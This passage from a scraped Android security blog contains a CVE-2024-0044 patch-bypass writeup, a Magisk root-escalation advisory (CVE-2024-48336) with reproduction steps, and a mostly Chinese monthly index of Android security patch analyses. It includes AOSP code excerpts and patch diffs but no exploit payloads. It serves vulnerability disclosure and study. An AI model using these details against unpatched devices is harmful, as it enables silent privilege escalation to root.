ExceptionUtils.maybeUnwrapIOException(e); throw e; &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125;&#125;When the caller is a 3rd-party app, installerPackageName is guaranteed to belong to the caller; when the caller is adb, it will always be reset to null, so this seems fine:12345678910111213141516171819202122String requestedInstallerPackageName = params.installerPackageName != null ? params.installerPackageName : installerPackageName;if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) &#123; params.installFlags |= PackageManager.INSTALL_FROM_ADB; // adb installs can override the installingPackageName, but not the // initiatingPackageName installerPackageName = null;&#125; else &#123; if (callingUid != Process.SYSTEM_UID) &#123; // The supplied installerPackageName must always belong to the calling app. mAppOps.checkPackage(callingUid, installerPackageName); &#125; // Only apps with INSTALL_PACKAGES are allowed to set an installer that is not the // caller. if (!TextUtils.equals(requestedInstallerPackageName, installerPackageName)) &#123; if (mContext.checkCallingOrSelfPermission(Manifest.permission.INSTALL_PACKAGES) != PackageManager.PERMISSION_GRANTED) &#123; mAppOps.checkPackage(callingUid, requestedInstallerPackageName); &#125; &#125;&#125;However, the operation occurs after requestedInstallerPackageName is set to installerPackageName, so the original value is kept.But if they run the original PoC provided by Tom Hebb instead of writing their own, they can catch the problem as the pm command calls the underlying createSession method with customized installerPackageName.One more question, why the problem isn’t caught by someone else while the PoC is publicly accessible?Well, this vulnerability has been analyzed, reproduced and exploited by many people on the Internet, and there is an article written by Qidan He (flanker) of JD Dawn Security Lab (this is a very interesting article about CVE-2024-31317 btw) that says “其中CVE-2024-0044因简单直接，在技术社区已经有了广泛的分析和公开的exp” (“CVE-2024-0044 has been widely analyzed and publicly exploited in the technical community because it is simple and direct”), however no one noticed it as if every one were under a spell.In fact, someone has successfully reproduced the exploit on patched builds, but the author doesn’t seem to realize what happened. I found it by a code review and reported it on May 16, 2024, 2 months after the original patch was released. If anyone before me would have taken a few extra seconds to carefully look at the patch, or just try running the PoC on patched builds to see whether the issue is actually fixed, the bug bounty would have been theirs. This sounds like a Chinese lyric, “再多看一眼就会爆炸”（”One more look and it will explode”）.","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"MagiskEoP (CVE-2024-48336)： Magisk App Arbitrary Code Execution Vulnerability","slug":"CVE-2024-48336","date":"2024-08-24T04:00:00.000Z","updated":"2025-04-24T10:33:02.808Z","comments":true,"path":"2024/08/24/CVE-2024-48336/","link":"","permalink":"https://blog.canyie.top/2024/08/24/CVE-2024-48336/","excerpt":"Magisk App before Canary version 27007 contains a vulnerability CVE-2024-48336, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package without user interaction.The following is copied from my repo https://github.com/canyie/MagiskEoP for backup purposes. For more info such as PoC code, please check the original repo.","text":"Magisk App before Canary version 27007 contains a vulnerability CVE-2024-48336, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package without user interaction.The following is copied from my repo https://github.com/canyie/MagiskEoP for backup purposes. For more info such as PoC code, please check the original repo.IntroductionThis is an exploit for a vulnerability CVE-2024-48336 in Magisk app that allows a local app to silently gain root access without user consent.Vulnerability was initially reported by @vvb2060 and PoC-ed by @canyie. It has been fixed in Canary 27007.Demo video for exploit this vulnerability to silently obtaining root privileges and granting root to any app: https://github.com/canyie/MagiskEoP/blob/main/screen-20220302-093745.mp4Steps to reproduce this vulnerability:Install vulnerable Magisk app builds on a device that has no GMS preinstalledInstall this exploit appForce stop Magisk app and this exploit appOpen Magisk appOpen this exploit app, type your commands and press Execute to execute them with root privilegesVulnerability InfoName: Magisk App Arbitrary Code Execution VulnerabilityAlias: Magisk Privilege Escalation VulnerabilityThe BasicsProduct: MagiskCVE: CVE-2024-48336Reporter: @vvb2060Initial Report Date: 2024-08-01Patch Date: 2024-08-21Disclosure Date: 2024-08-24Affected Versions: Manager v7.0.0 ~ Canary 27006First Patched Versions: Canary 27007Issue/Bug report: https://github.com/topjohnwu/Magisk/issues/8279Patch CL: https://github.com/topjohnwu/Magisk/commit/c2eb6039579b8a2fb1e11a753cea7662c07bec02Bug-introducing CL: https://github.com/topjohnwu/Magisk/commit/920b60da19212dd8d54d27ada77a30067ce50de6Bug Class: Unsafe Dynamic External Code LoadingWeakness Enumerations:CWE-386: Symbolic Name not Mapping to Correct ObjectCWE-829: Inclusion of Functionality from Untrusted Control SphereSummaryThe install() function of ProviderInstaller.java in Magisk App before canary version 27007 does not verify the GMS app before loading it, which allows a local untrusted app with no additional privileges to silently execute arbitrary code in the Magisk app and escalate privileges to root via a crafted package, aka Bug #8279. User interaction is not needed for exploitation.DetailsOld Android versions do not support some algorithms. To make Magisk work properly on these platforms, it tries to load conscrypt from GMS by calling createCallingContext(). Check this link for more details: https://t.me/vvb2060Channel/692However, GMS is not always preinstalled on all devices. Magisk assumes that loading code from GMS is always safe, however attackers can create a fake malicious app with the same package name. When Magisk app is launched, malicious code will get executed in Magisk app. Since Magisk app is always granted root access, this allows attackers to silently gain root access and execute arbitrary code with root privileges without user acceptance.Vulnerable DevicesDevices with no GMS preinstalledDevices with broken signature verification implementation (e.g. Disabled by CorePatch)Note: This issue is fixed in Canary 27007 by ensuring GMS is a system app before loading it. However, it’s still possible to exploit this issue on devices with pre-installed GMS but have broken signature verification implementations (e.g. CorePatch).Note 2: Although a fix for this issue is present in the official Magisk app, there are many other instances of similar code exist in other apps without a proper fix such as this and this. This potentially allows an arbitrary code execution in vulnerable apps and potentially allows attackers to gain root access again if it is granted to victim apps.","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Android 2024 每月安全补丁分析索引","slug":"android-security-bulletin-index","date":"2024-04-18T11:27:12.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2024/04/18/android-security-bulletin-index/","link":"","permalink":"https://blog.canyie.top/2024/04/18/android-security-bulletin-index/","excerpt":"之前一直在看的每月补丁分析的博客 https://wrlus.com/ 看起来是不再更新了，想了想反正自己每个月也要去追着看，干脆写一下分析得了，方便自己后面找。本人很菜，分析的大部分都是 Java 层漏洞，大佬别骂我 QAQ最初发表在我的 telegram 频道。每月补丁都会在此文中更新。2025 年度补丁分析：点我最后更新时间：2025/01/29 更新内容：添加 2025 年度链接","text":"之前一直在看的每月补丁分析的博客 https://wrlus.com/ 看起来是不再更新了，想了想反正自己每个月也要去追着看，干脆写一下分析得了，方便自己后面找。本人很菜，分析的大部分都是 Java 层漏洞，大佬别骂我 QAQ最初发表在我的 telegram 频道。每月补丁都会在此文中更新。2025 年度补丁分析：点我最后更新时间：2025/01/29 更新内容：添加 2025 年度链接2024-12-01不知不觉，这个栏目竟然就开了整整一年了，说实话我自己都没想到我竟然能坚持一年，感谢大家一直以来的陪伴！经过一年更新，这篇文章已经过长，从 2025 年开始将开一个新的文章进行更新，以后应该每年都会开新文章。我们明年再见！另外为什么这个月补丁这么少？才六个，跟以前的完全不是一个量级FrameworkCVE-2024-43762 EoP High 1此漏洞由我发现并报告。App Widget Service 绑定到 app 的 service 时没有正确处理 onNullBinding，会导致连接不会被销毁。CVE-2024-43764 EoP High 1设备没解锁的时候禁止进入交互式剪贴板页面，否则可能让接触到设备的攻击者通过剪贴板里已有的 intent 逃逸出锁屏。其实应该还有信息泄漏？CVE-2024-43769 EoP High 1还有高手（？？如果 Device Management 这个 role 的持有者是系统应用，在其他用户也将其当作 device admin 而非仅在它所在的用户，因为 apk 的版本是跨用户全局共享的，在一个无关用户选择卸载更新会影响其他受管用户，对设备管理功能造成潜在影响，应该禁止。Device Management Role 这个功能其实没看见有多少人用，应该还是传统的 device owner / profile owner 用的人比较多。System三个都是 libskia 中的内存漏洞，这种情况还是很少见的。简单看了一下和上个月的 CVE-2024-43091 基本类似，致谢信息也都是 Google 的同一个人，应该是代码审查的时候看见的。CVE-2024-43767 RCE High 1SkBlurMF.cpp 有一个地方调用了 computeImageSize() 计算要分配的大小，但没检查计算时发生溢出的情况（这个时候会返回 0），会在下方分配出大小为 0 的内存。CVE-2024-43097 EoP High 1SkRegion.cpp 内计算分配内存大小时可能会发生溢出。CVE-2024-43768 EoP High 1src/pdf/SkDeflate.cpp skia_alloc_func 更加严格地校验 size 和 items，看起来也是类似的问题，防止数学计算产生非预期的结果进而导致分配的内存大小小于预期。P.S. 感兴趣的人还可以看看 SkTFitsIn 这个函数的实现，我看了一眼，感觉非常仙人2024-11-01FrameworkCVE-2024-40660 EoP High 1 2看起来是和 CVE-2024-34743 类似的问题，引用拷贝写成了值拷贝。CVE-2024-43081 EoP High 1此漏洞由我发现并报告。此漏洞是 CVE-2024-0046 的变体，当时的补丁只限制了系统 app 不能被安装为 instant app，很容易能想到除了系统 app，设备管理 app 也不应该被限制，直接又提了个报告。补丁加上了 device admin app 和被保护的 app 的检测。CVE-2024-43085 EoP High 1USB 传输模式切换超时的时候，如果当前处于 Accessory 模式，不应该继续保持在这个模式，以阻止 USB 设备继续通过 Android Open Accessory 协议和 Android 设备进行交互。Android Open Accessory 文档：https://source.android.com/docs/core/interaction/accessories/protocolCVE-2024-43093 EoP High 1此漏洞由 LSPosed 团队报告。在传入的 URI 中插入 Unicode 可忽略代码点可绕过 /sdcard/Android/data 访问限制。技术细节：https://t.me/vvb2060Channel/855CVE-2024-43082 ID High 1设置新用户头像时检查返回的 URI，避免出现跨用户读取。这个地方我之前尝试过利用，但是没成功，没能拦截到任何一个 intent，不知道漏洞的作者是怎么做到的。看补丁只给 12 12L 更新了，可能是安卓大版本的行为差异导致。CVE-2024-43084 ID High 1NotificationManagerService 检查 notification URI 的时候，如果它带有 Person 对象，不仅要检查它的 Icon URI 还要检查 mUri。CVE-2024-43086 ID High 1如果账号的 authenticator uid 发生改变，清掉对应账号类型的所有数据。看起来是 AccountManagerService 里的数据能悬空。SystemCVE-2024-43091 RCE High 1libskia 的一个整数溢出问题，之前的代码只检查了 dst-&gt;computeImageSize() 的结果没溢出，但下面分配了 size 乘三倍的内存，这里有可能发生溢出导致分配到的内存空间小于预期，进而发生越界写。CVE-2024-29779 EoP High 1没太看懂，看起来是代码里实现了 Keymint3 的 ATTESTATION_ID_SECOND_IMEI 但是忘记启用的样子CVE-2024-34719 EoP High 1蓝牙组件里禁止传入的 AttributionSource 是 null 的情况，因为蓝牙依赖 AttributionSource 检查调用者权限，传 null 的时候不会触发 AttributionSource 反序列化也就不会触发权限校验流程。题外话：这个 bug 的 id 是 242996380，估计都是两年前的了，这个处理速度，我也不直接评价了，我就给四个字，令人咋舌CVE-2024-40661 EoP High 1device admin 不允许主动授予隐私相关的权限，比如录音照相和位置权限，这个检查要把权限的权限组一起纳入检查，而不是只检查权限名。CVE-2024-43080 EoP High 1此漏洞由我发现并报告。Settings AppRestrictionsFragment 接收 app 传回的原始 intent 之后不能直接传给 startActivity，避免在 AIDL 调用过程中出现类型混淆污染后续数据。更多可参考 https://konata.github.io/posts/creator-mismatch/CVE-2024-43087 EoP High 1Settings AccessibilitySettings 显示无障碍服务列表的时候会过滤 service label 和 activity label 相同的服务，导致其被隐藏不显示而仍然拥有无障碍权限。这个处理看不懂原本是干啥的，完全多此一举，补丁就是删掉了对应代码。CVE-2024-43088 EoP High 1此漏洞由我发现并报告。Settings 中 AppInfoBase 是一个 base fragment，接收调用者指定的 user handle 然后直接使用，全程没进行任何检查，导致可以指定任意用户从而代表其他用户修改其 app 的权限。补丁加了个检查保证调用者必须要有 INTERACT_ACROSS_USERS_FULL 权限。这个漏洞是我之前编写 Android 平台常见安全漏洞类型 的时候注意到 CVE-2023-21107 这个相似的漏洞，顺便搜索了一下涉及的 Intent.EXTRA_USER_HANDLE 还有没有其他地方有引用，然后就让我发现了这个一模一样的漏洞，属于是白捡天上掉下来的钱了。CVE-2024-43089 EoP High 1MediaProvider 中，app 尝试重命名文件时需要检查其权限，以免在 MediaProvider 数据库中留下虚假的记录，让 app 可以读写原本不属于它的文件。CVE-2024-43090 ID High 1此漏洞由我发现并报告。Android 有一个功能叫做 keyboard shortcuts helper，其实现是系统向当前前台 app 收集可用快捷键，然后交由 SystemUI 把它渲染出来，其包含着一个隐藏的 Icon 对象，可以使用反射进行修改。补丁表示这个功能不应该由 app 使用，直接清空了所有 app 提供的 icon。CVE-2024-43083 DoS High 1WiFi 模块中忘记校验提供的 WifiConfiguration 中的多个字段，可能引发拒绝服务，应该是内存资源耗尽。最近这种漏洞是真的多，几乎每个月都能看见。2024-10-01FrameworkCVE-2024-0044 EoP High 1 2是不是感觉这个 CVE 号很熟悉？对，这个漏洞在三月公告里就放过一次。后面我发现原补丁给的修复并不充分重新发送了一个报告，给这个三月份就应该被修复的漏洞续命到了十月。更多细节可以参考我的 PoC &amp; writeup： https://github.com/canyie/CVE-2024-0044CVE-2024-40676 EoP High 1AccountManagerService checkKeyIntent 内添加新的检查，拒绝所有 data 带有 content URI 的 intent。好暴力的补丁，让人摸不着头脑，一开始以为是 URI grant，仔细研究之后发现还不是，问题比较复杂，利用非常精妙，准备以后单独写一篇文章描述这个问题（挖坑+1）。更新：已经给出完整分析，可查看 http://blog.canyie.top/2024/11/07/self-changing-data-type/CVE-2024-40675 DoS High 1把 URI 解析成 Intent 的时候检查里面每个字段的结尾分号是否存在，不存在则直接终止解析并抛出 URISyntaxException。SystemCVE-2024-40673 RCE High 1Java ZipFile API 拒绝文件头无效的 zip 文件。更多请参阅发现者的博客：https://wrlus.com/android-security/cve-2024-40673/CVE-2024-40672 EoP High 1设置向导结束之前不允许打开 ChooserActivity，避免 FRP 绕过。CVE-2024-40677 EoP High 1设置向导结束之前不允许打开“应用电池用量”的管理页面，避免 FRP 绕过。CVE-2024-40674 DoS High 1插入 WifiConfiguration 的时候，如果 SSID 以引号开头，之前的代码不会检查它的长度，可以导致拒绝服务。补丁就是加上了这种情况的检查。只影响 14。2024-09-01这个栏目不如改叫每月安全补丁提交信息翻译 都没啥分析了已知被在野利用漏洞：CVE-2024-32896FrameworkCVE-2024-32896 EoP High 1 2恢复出厂设置时，在重启到 recovery 之前删除 data 分区加密密钥，保证重启失败（比如按音量键导致设备提前进入 bootloader 模式而非 recovery）时设备数据也无法被恢复。此漏洞已知正在被数据取证公司在野利用。CVE-2024-40658 EoP High 1libstagefright 中处理 HDR10+ 视频的一个越界写入问题。CVE-2024-40662 EoP High 1解析 uri 时移除 scheme 中的 “://” 字符串。SystemCVE-2024-40650 EoP High 1设置应用中编辑 wifi 信息时限制最长只能输入 500 个字符，看漏洞描述是能 crash Settings 从而绕过 FRPCVE-2024-40652 EoP High 1设置向导结束之前如果尝试启动系统设置，直接关闭CVE-2024-40654 EoP High 1补丁链接跟五月份的 CVE-2024-23707 是一样的，不知道为什么又放了一遍。更新：注意到之前的补丁只给 14 更新了，这次给 12-14 都更新了，应该是解决 14 之前版本没打补丁的问题。CVE-2024-40655 EoP High 1绑定 CallScreenService 超时了也需要 unbind。CVE-2024-40657 EoP High 1Settings 加载应用定义的账号配置页面时，由于是直接解析 xml 然后加载，android:fragment 这个属性也会生效，从而可以调起 Settings 内的任意 fragment。CVE-2024-40656 ID High 1ConnectionService createConference 忘了检查传入的 StatusHints 是否包含跨用户的 icon。CVE-2024-40659 DoS High 1RKP app 的 RemoteProvisioningService 限制只能 system server 才能 bind。这个漏洞我们很早就注意到了，但是研究之后觉得没有安全风险就没报，结果是高危漏洞，痛失 7000 😭 虽然没看懂咋触发 DoS，看描述是可以为其他应用上传密钥从而持久禁用相关功能。关于 RKP 的功能说明：https://t.me/vvb2060Channel/8122024-08-01可能被在野利用的漏洞：CVE-2024-36971，内核的一个 UAF 漏洞（严重怀疑打错了，可能想写的是 CVE-2024-34735）FrameworkCVE-2023-20971 EoP High 1PermissionManagerServiceImpl 中，有个判断看是不是尝试移除非动态的权限，结果只有个 log 忘了 return。这个 CVE 去年在 Pixel 六月公告就出现过，当时评的是 moderate，给 13 更新了，结果这次奇怪地给 14 也更新了，补丁是今年创建的，里面的 android id 也跟公告里的对不上，翻 CVE 描述也是说问题在 updatePermissionTreeSourcePackage 里而非补丁改的 removePermission，怀疑根本就不是同一个问题，不知道为啥复用了 CVE ID。Summary：privilege escalation - obtain dangerous system permissions silently utilizing the &lt;permission-tree&gt; elementDetails：In removePermission of PermissionManagerServiceImpl.java, there is a possible way to obtain dangerous permissions without user consent due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.In updatePermissionTreeSourcePackage of PermissionManagerServiceImpl.java, there is a possible way to obtain dangerous permissions without user consent due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-225880325CVE-2023-21351 EoP High 1跟 CVE-2024-0034 类似，给 Android 14 以下系统的，绑定到 TextToSpeech Service，Job Service，Print Service，Sync Service 和 MediaRoute2Provider Service 的时候指定 flag 阻止 BAL（早不给，这都24年8月了才给）CVE-2024-34731 EoP High 1 2 3 4 5同时修改了五个模块（health HAL、libmediatranscoding、neuralnetworks、keystore2、nfc）的代码，看起来是对 Binder DeathRecipient cookie 的管理问题。去翻了一下文档，AIBinder_unlinkToDeath 的文档里有这句话：Be aware that it is not safe to immediately deallocate the cookie when this call returns. If you need to clean up the cookie, you should do so in the onUnlinked callback, which can be set using AIBinder_DeathRecipient_setOnUnlinked.CVE-2024-34734 EoP High 1锁屏的时候下拉状态栏，点开 Active apps，里面会显示当前活跃的应用，右边有个 Stop 按钮停止进程，用这种方式可以杀掉 VPN app。应该改成先解锁再显示。CVE-2024-34735 EoP High 1补丁链接跟 CVE-2023-21351 是一样的。CVE-2024-34737 EoP High 1限制 app 一分钟只能修改 60 次 PiP aspect ratio，否则 “could result flood of PiP resizing requests and freeze the PiP window”。怀疑是导致 pip 窗口渲染异常，使得其不可见，从而在用户无感知的情况下长期持有前台权限。setAspectRatio 文档：https://developer.android.com/reference/android/app/PictureInPictureParams.Builder#setAspectRatio(android.util.Rational)更新：有人复现了这个漏洞，见 https://blog.lleavesg.top/article/EvilPiP#1153fb9e943280f5ae27d6c44fc85d79CVE-2024-34738 EoP High 1如果调用者没有 GET_APP_OPS_STATS 特权，不返回被标记了 restrictRead 的 Op。简单搜索只找到 ACCESS_RESTRICTED_SETTINGS 一项是 restricted 的，不知道具体有什么作用。CVE-2024-34739 EoP High 1设置向导未完成时，插入 USB 设备不弹出 activity，避免 FRP 绕过。CVE-2024-34740 EoP High 1 2FastDataOutput 内会检查一次写入的字符串数据不能超过 65535 个字节，但 BinaryXmlSerializer 中 attributeBytesHex 与 attributeBytesBase64 两个方法会按照 byte[] 写入，走这条路径是没有检查的。这两个方法会将 value 的长度作为一个 unsigned short 写入，如果 length &gt; 65535 就会丢失高位的数据，之后将 value 作为 byte[] 整体写入。下次开机时使用 BinaryXmlPullParser 读取并解析该文件，先读数据长度（unsigned short）再读对应大小的数据，会导致数据没被完全消耗完，后续解析出来的数据被污染，合理利用可以实现注入。CVE-2024-34741 EoP High 1WindowState setForceHideNonSystemOverlayWindowIfNeeded 内要检查父窗口的属性，否则 SAW 窗口下的其他类型子窗口不会被隐藏CVE-2024-34743 EoP High 1surfaceflinger 内遍历 states 时写成了值拷贝，然后 sanitize 事实上不会影响到原来的对象，应该改成用引用。CVE-2024-34736 ID High 1StagefrightRecoder 在音源为麦克风且视频源为 surface（设备画面？）时禁用 B 帧支持，否则会出现不同步。音视频超出了我的知识体系，没办法啊~~CVE-2024-34742 DoS High 1更改逻辑保证数据始终被写入到 device_owners2.xml 。只影响14，应该跟之前的 CVE-2024-0047 是类似的问题。SystemCVE-2024-34727 ID High 1蓝牙 sdp_utils.cc 中检查 p_attr-&gt;attr_len_type 是否为预期，防止后续缓冲区溢出。2024-07-01已知被利用漏洞：Arm Mali GPU Kernel Driver Use-After-Free Vulnerability CVE-2024-4610（Android 安全公告未发出警告，信息来源于 CISA Known Exploited Vulnerabilities Catalog）FrameworkCVE-2024-31320 EoP Critical 1 2CompanionDeviceManagerService 处理配对请求时接受一个 AssociationRequest，里面包含一个变量 mSkipPrompt 可以跳过用户确认，原本预期这个值只应该由系统设置，但代码里出现逻辑错误，mayAssociateWithoutPrompt 返回 false 时没有覆盖掉 app 设置的值。只影响 Android 13 以前。这个严重给的名副其实，可惜我的 CVE-2024-31318 没给严重 😭CVE-2024-31331 EoP High 1调用 setMimeGroup 成功后要发送 ACTION_PACKAGE_CHANGED 广播。不懂不发送会有什么问题。漏洞描述：In setMimeGroup of PackageManagerService.java, there is a possible way to hide the service from Settings due to a logic error in the code. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.CVE-2024-34720 EoP High 1有新进程连接到 Zygote 时校验其 UID，确保是 system UID。原本 selinux policy 会限制只允许 system server 连接到 zygote 进程，但是对 app zygote 这个限制不够严格，两个 app zygote 进程可以相互连接然后发送伪造命令。更多关于 app zygote 可以参考 android:usesAppZygote 和 ZygotePreload 的文档，我之前的检测 magisk 那篇文章也有简单提及。CVE-2024-34723 EoP High 1MediaSession ParcelableListBinder 只允许塞入指定类型的对象，防止后台启动绕过。这个问题之后会单独写一篇文章讲解。SystemCVE-2024-31332 EoP High 1如果当前用户被设置了 DISALLOW_ADD_WIFI_CONFIG，不显示 WifiDppConfiguratorActivity 和 AddNetworkFragment。CVE-2024-31339 EoP High 1statsd 中，MultiConditionTrigger 可能会开启一个新线程 executorThread，该线程会持有外部资源引用，应该在 MultiConditionTrigger 被销毁时 join 这个线程保证它执行完毕。应该是 race condition 导致 UAF 的问题。CVE-2024-34722 EoP High 1蓝牙组件的问题，似乎是逻辑 bug。看不懂，告辞~12345Fix an authentication bypass bug in SMPWhen pairing with BLE legacy pairing initiatedfrom remote, authentication can be bypassed.This change fixes it.CVE-2024-34721 ID High 1MediaProvider 中插入文件时，对文件路径没有被显式指定的情况缺乏检查，导致可以插入到其他用户的储存。听起来挺有意思的，后续可以复现玩玩。2024-06-01这个月竟然一个 critical 都没有，奇迹啊FrameworkCVE-2023-21266 EoP High 1禁止第三方应用通过 killBackgroundProcesses() 杀死其他应用的进程。看 CVE 描述是能一直杀 play 保护服务的进程从而绕过 play 保护。去年 10 月就放过一遍了，不知道为什么又放了一遍。CVE-2024-31310 EoP High 1强制自动填充服务必须声明对应的 intent-filter。没有追详细调用链，猜测是为了防止 serviceComponent 被任意指定，调用到未导出的 service？更新：漏洞描述指出了细节：用户选择它为自动填充 app -&gt; apk 更新，新的 apk 里这个服务缺失 intent-filter -&gt; 系统自动重绑定该服务 -&gt; 用户去设置里查看时，由于此时该 service 没有 intent-filter，该 app 不会被显示出来。Summary: App can continue to fill input fields in the device even if user has not selected it as default Autofill service app.Details: In newServiceInfoLocked of AutofillManagerServiceImpl.java, there is a possible way to hide an enabled Autofill service app in the Autofill service settings due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2024-31316 EoP High 1AccountManagerService 在修改返回的 bundle （具体是三处 remove 敏感信息的地方）之后重新检查 bundle 内的 intent 是否合法。简单想了一下，没想到 lazy bundle 加持下能怎么利用，猜测是在非 lazy bundle 的场景下，按照 mismatch 对象、被移除的键值对、恶意 intent 这个顺序放置来绕过 checkKeyIntentParceledCorrectly？CVE-2024-31317 EoP High 1如果设置的 hidden api exemptions 含有非法字符，不把它传递给 zygote，防止干扰参数解析。此漏洞可被用于伪造 uid 等参数，在任意 app 上下文中执行任意代码。https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.htmlCVE-2024-31318 EoP High 1此漏洞由我发现并报告。CompanionDeviceManagerService onShellCommand() 内没有检查调用者权限，然后直接调用了同样没有权限检查的内部接口，造成越权访问，并直接造成权限提升。修复为把 onShellCommand() 改成重写 handleShellCommand()，因为 Binder.onShellCommand() 会先检查调用者 uid 确保必须是 root/shell。关于这个漏洞的一点点番外：通过分析提交历史，我发现这个函数以前其实是有一个权限检查的，但是在 Android 14 的一个提交 https://cs.android.com/android/_/android/platform/frameworks/base/+/7a8f22792e45630bff14eb8b276c7649b0d79097 里被人删掉了。所以这其实是一个只影响 Android 14 的漏洞（这下新版本魔人大失败了）。由于我不是 Google 员工，没法直接知道这个人这么做的原因，我这里只能猜测一下：可能是眼花了把这里看成已经在用 handleShellCommand 了，可能是觉得权限检查重复（Android 12 的时候这块代码在 ShellCmd 构造函数里），或者干脆就是 git 出了 bug 把这行给意外移除了，类似那个 gotofail 漏洞。继续追踪提交历史，我发现了一个更搞笑的：2020 年，同样的系统服务，同样的 onShellCommand，曾经出现过一个一模一样的漏洞 CVE-2020-0227 https://android.googlesource.com/platform/frameworks/base/+/84cccfe6cdbc57ee372ee1a0fea64c7a11c53766^!/#F1 。嗯，让你不写回归测试，白给赏金了这下。时间线：2023.10.4 Android 14 正式发布2023.11.25 我注意到此漏洞2023.11.26 构建了 PoC 并向 Android 安全团队反馈2024.2.10 Google 确认此漏洞并将严重程度评级为高。对，你没看错，两个半月2024.5.21 Google 通知我补丁将在下个月发布，并分配 CVE-2024-313182024.6.3 已经过去了 190 天，补丁终于发布CVE-2024-31319 EoP High 1NotificationListenerService 修改 notification channel 的 sound 时，校验它是否有权限访问这个 uri。（漏洞类型不应该给 ID 吗，为啥给了个 EoP？）CVE-2024-31322 EoP High 1对于被卸载的应用，把其提供的 AccessibilityService 从已启用的服务列表里面移除。我记得这个问题以前好像处理过一次，向上追了一下，只有在 onUserStateChangedLocked() 有机会调用到这里，猜测此漏洞是在管理员用户卸载其他用户的应用而对应用户处于非活跃状态的时候触发？CVE-2024-31324 EoP High 1如果窗口没有隐藏动画，需要立即隐藏它。说实话，没怎么看懂，看 CVE 描述是通过以竖屏模式启动 activity 然后旋转到横屏模式可以绕过点按劫持保护，似乎是逻辑漏洞。留给有缘人分析复现吧~~12345678910Hide window immediately if itself doesn&#39;t run hide animationThe condition was overextended in commit 9bca6b4 which checks if theparent container of the window is animating. That causes the window towait for animation finish to update visibility, but the animationfinish callback won&#39;t happen because itself is not animating. Then thewindow that should be hidden remains on screen.Bug: 302431573Test: atest WindowStateTests#testIsOnScreen_hiddenByPolicyCVE-2024-31325 EoP High 1SystemUI 解析 notification message/conversation 相关的图片 uri 时需要使用对应用户的 context。不确定在什么时候能触发。（看起来漏洞类型应该给 ID 才对？还有为什么放 framework 里而不是 system？）CVE-2024-31326 EoP High 1 2Android 14 设备管理相关的配置存储方式发生变化，而又没有正确迁移相关配置，导致设备从旧版本更新到 14 之后设备管理员做出的限制丢失。具体来说是截图策略（screen capture policy）、lock task 配置、user restrictions 这三个。CVE-2024-31312 ID High 1如果设置锁屏隐藏通知，隐藏 media carousel（媒体操作面板？）。CVE-2024-31314 DoS High 1ShortcutService 可能会调用 UsageStatsManager.reportShortcutUsage()，对调用频率添加限制，防止拒绝服务。SystemCVE-2023-21113 EoP High 1 2 3如果 AttributionSource 反序列化不是因为 binder 调用被触发，清空所有权限状态。CVE-2023-21114 EoP High 1 2 3WiFi 模块中先把 AttributionSource 从 bundle 提取出来再把任务交给工作线程处理。由于 android 13 引入的 lazy bundle 优化，对于 parcelable 类型只有在被实际访问的时候才会触发反序列化，而原来的代码中 bundle 里的 AttributionSource 在工作线程而非 binder 线程中被访问，触发反序列化时 Binder.getCallingUid() 等方法返回的是 system server 自己的信息，造成权限绕过。CVE-2024-31311 EoP High 1libstatssocket 内检查 AStatsEvent 的 lastFieldPos 必须小于 bufSize。12345678 // Side-effect: modifies event-&gt;errors if field has too many annotations static void increment_annotation_count(AStatsEvent* event) &#123;+ if (event-&gt;lastFieldPos &gt;= event-&gt;bufSize) &#123;+ return;+ &#125; uint8_t fieldType = event-&gt;buf[event-&gt;lastFieldPos] &amp; 0x0F; uint32_t oldAnnotationCount = (event-&gt;buf[event-&gt;lastFieldPos] &amp; 0xF0) &gt;&gt; 4; uint32_t newAnnotationCount = oldAnnotationCount + 1;CVE-2024-31313 EoP High 1消息队列里检查越界情况。CVE-2024-31315 EoP High 1NotificationListenerService rebind 及所属包更新的时候，如果此时该服务不再被权限保护（没有声明 android:permission），不要 bind 它。（这也算漏洞？CVE 描述又看不了，不清楚有没有其他触发场景）查看描述后发现和上面的 CVE-2024-31310 是类似的：用户打开权限 -&gt; apk 更新，新的 apk 里这个服务不再被 permission 保护 -&gt; 系统自动重绑定该服务 -&gt; 用户去设置里查看时，由于此时该 service android:permission 配置不对，该 app 不会被显示出来。Summary: App can read all notifications of the device without requiring any permission.Details: In multiple functions of ManagedServices.java, there is a possible way to hide an app with notification access in the Device &amp; app notifications settings due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2024-31323 EoP High 1悬浮窗覆盖漏洞限时返场，这次是 Health Connect 这个 app 里。只影响 14。CVE-2024-31327 EoP High 1补丁链接和 CVE-2024-31313 是一样的。2024-06-05KernelCVE-2024-26926 EoP High 1 2内核 binder 驱动里 binder_get_object() 检查 offset 必须按 4 字节对齐。2024-05-01FrameworkCVE-2024-0024 EoP High创建用户时限制将用户名、账号名、账号类型这三个字符串的长度，否则长度可能会超出 BinaryXmlSerializer 的写入限制，导致后续 user restrictions 写入失败，创建出没有限制的用户。疑问：我在今年1月4号就已经在 aosp 上看见了这个提交，为什么现在才放在安全公告里？CVE-2024-0025 EoP High发送非 PendingIntent 类型的 IntentSender 时避免携带 allowlist token。因为这个时候传入的 